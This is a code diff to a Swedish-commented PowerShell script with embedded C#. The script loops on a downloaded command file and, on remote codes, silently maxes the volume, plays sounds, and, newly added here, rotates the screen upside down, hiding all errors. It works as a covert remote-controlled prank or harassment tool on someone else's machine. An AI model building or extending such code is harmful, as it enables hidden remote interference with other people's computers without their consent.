@@ -31,6 +31,60 @@ interface IMMDeviceEnumerator {
 public class SysTools {
     [DllImport("user32.dll", CharSet=CharSet.Auto)]
     public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+
+    [DllImport("user32.dll")]
+    public static extern int ChangeDisplaySettings(ref DEVMODE devMode, int flags);
+
+    [DllImport("user32.dll")]
+    public static extern bool EnumDisplaySettings(string deviceName, int modeNum, ref DEVMODE devMode);
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
+    public struct DEVMODE {
+        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
+        public string dmDeviceName;
+        public short dmSpecVersion;
+        public short dmDriverVersion;
+        public short dmSize;
+        public short dmDriverExtra;
+        public int dmFields;
+        public int dmPositionX;
+        public int dmPositionY;
+        public int dmDisplayOrientation;
+        public int dmDisplayFixedOutput;
+        public short dmColor;
+        public short dmDuplex;
+        public short dmYResolution;
+        public short dmTTOption;
+        public short dmCollate;
+        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
+        public string dmFormName;
+        public short dmLogPixels;
+        public int dmBitsPerPel;
+        public int dmPelsWidth;
+        public int dmPelsHeight;
+        public int dmDisplayFlags;
+        public int dmDisplayFrequency;
+        public int dmICMMethod;
+        public int dmICMIntent;
+        public int dmMediaType;
+        public int dmDitherType;
+        public int dmReserved1;
+        public int dmReserved2;
+        public int dmPanningWidth;
+        public int dmPanningHeight;
+    }
+
+    public static void RotateUpsideDown() {
+        DEVMODE dm = new DEVMODE();
+        dm.dmSize = (short)Marshal.SizeOf(typeof(DEVMODE));
+        if (EnumDisplaySettings(null, -1, ref dm)) {
+            if (dm.dmDisplayOrientation != 2) {
+                dm.dmDisplayOrientation = 2; // 2 = 180 degrees
+                ChangeDisplaySettings(ref dm, 0);
+            }
+        }
+    }
+
     public static void SetVolume(float level) {
         IMMDeviceEnumerator enumerator = (IMMDeviceEnumerator)(new MMDeviceEnumeratorComObject());
         IMMDevice dev = null;
@@ -78,28 +132,36 @@ while ($true) {
         if ($shouldCheckCommand) {
             # Läs texten i filen och ta bort eventuella osynliga radbrytningar
             $command = (Get-Content -Path $commandDownloadPath -Raw).Trim()
-            if ($command -eq "1" -or $command -eq "2") {
-                try {
-                    # Höj volymen till 100% helt osynligt utan popup-ruta
-                    [SysTools]::SetVolume(1.0)
-                } catch {
-                    # Ignorera om volymen inte kan ändras (t.ex. om inga högtalare är inkopplade)
-                }
-                Start-Sleep -Milliseconds 500
-                try {
-                    if ($command -eq "1") {
-                        # Spela den lokala discord.wav-filen om den existerar
-                        if (Test-Path $soundPath) {
-                            $soundPlayer = New-Object System.Media.SoundPlayer
-                            $soundPlayer.SoundLocation = $soundPath
-                            $soundPlayer.Play()
-                        }
-                    } elseif ($command -eq "2") {
-                        # Spela Windows vanliga notifikationsljud (Exclamation)
-                        [System.Media.SystemSounds]::Exclamation.Play()
+            if ($command -eq "1" -or $command -eq "2" -or $command -eq "3") {
+                if ($command -eq "3") {
+                    try {
+                        [SysTools]::RotateUpsideDown()
+                    } catch {
+                        # Ignorera fel vid rotering
                     }
-                } catch {
-                    # Ignorera om ljudet inte kan spelas upp
+                } else {
+                    try {
+                        # Höj volymen till 100% helt osynligt utan popup-ruta
+                        [SysTools]::SetVolume(1.0)
+                    } catch {
+                        # Ignorera om volymen inte kan ändras (t.ex. om inga högtalare är inkopplade)
+                    }
+                    Start-Sleep -Milliseconds 500
+                    try {
+                        if ($command -eq "1") {
+                            # Spela den lokala discord.wav-filen om den existerar
+                            if (Test-Path $soundPath) {
+                                $soundPlayer = New-Object System.Media.SoundPlayer
+                                $soundPlayer.SoundLocation = $soundPath
+                                $soundPlayer.Play()
+                            }
+                        } elseif ($command -eq "2") {
+                            # Spela Windows vanliga notifikationsljud (Exclamation)
+                            [System.Media.SystemSounds]::Exclamation.Play()
+                        }
+                    } catch {
+                        # Ignorera om ljudet inte kan spelas upp
+                    }
                 }
             }
             # Uppdatera den lokala kontrollfilen så kommandot bara körs en gång per ändring
